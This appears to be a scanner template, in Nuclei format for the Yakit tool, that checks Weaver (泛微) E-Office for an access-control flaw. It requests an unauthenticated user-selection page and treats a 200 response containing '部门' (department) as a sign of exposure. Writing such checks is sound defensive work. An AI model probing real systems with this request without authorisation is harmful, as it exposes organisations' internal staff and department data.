script_name: [泛微-e-office-permissionac]: 泛微 E-Office Permission Access Control
content:
id: 泛微-e-office-permissionac

info:
  name: 泛微 E-Office Permission Access Control
  author: yuyin
  severity: high
  description: 检测泛微 E-Office 系统中的权限访问控制漏洞，通过发送特定的 GET 请求，如果响应状态码为 200 且包含 "部门" 关键字，则表示存在权限访问控制漏洞。
  reference:
    - https://
  tags: permission-ac, 泛微-e-office

requests:
  - raw:
      - |-
        GET /E-mobile/App/System/UserSelect/index.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36
        Connection: close
        Content-Length: 189
        Content-Type: text/plain
        Accept-Encoding: gzip

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "部门"
        part: body

    attack:
      - Hostname: "{{Hostname}}"
params: "[{\"Field\":\"target\",\"TypeVerbose\":\"string\",\"FieldVerbose\":\"扫描目标\",\"Help\":\"扫描目标可接受：主机名 / 主机名:端口 / IP段 / URL 等多种格式\",\"Required\":true},{\"Field\":\"reverse-url\",\"TypeVerbose\":\"string\",\"FieldVerbose\":\"反连 URL\",\"Help\":\"可使用 InteractshURL 也可使用 Yakit Reverse URL\"},{\"Field\":\"debug\",\"TypeVerbose\":\"boolean\",\"FieldVerbose\":\"设置调试模式\",\"Help\":\"开启调试模式，调试模式将输出尽量多的调试信息\"},{\"Field\":\"proxy\",\"TypeVerbose\":\"proxy\",\"FieldVerbose\":\"HTTP 代理\",\"Help\":\"设置 HTTP 代理\"}]"
help: 检测泛微 E-Office 系统中的权限访问控制漏洞，通过发送特定的 GET 请求，如果响应状态码为 200 且包含 "部门" 关键字，则表示存在权限访问控制漏洞。
author: ge
